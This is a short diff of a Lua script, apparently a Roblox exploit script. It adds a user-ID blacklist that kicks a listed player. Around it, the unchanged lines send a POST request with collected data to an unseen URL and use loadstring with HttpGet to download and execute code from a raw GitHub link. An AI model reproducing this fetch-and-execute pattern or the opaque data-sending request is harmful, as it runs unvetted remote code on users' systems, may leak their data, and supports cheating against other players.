@@ -33,6 +33,25 @@ local url =
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+
+local Blacklist = {318347167}
+
+local function checkIfBlacklisted(player)
+    for _, v in pairs(Blacklist) do
+        if player.UserId == v then
+            return true
+        end
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    local blacklistIsTrue = checkIfBlacklisted(player)
+    
+    if blacklistIsTrue then
+        player:Kick("cant execute this")
+    end
+end)
+
 wait(3)
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/0438785795/hfeuwf/main/key'))()
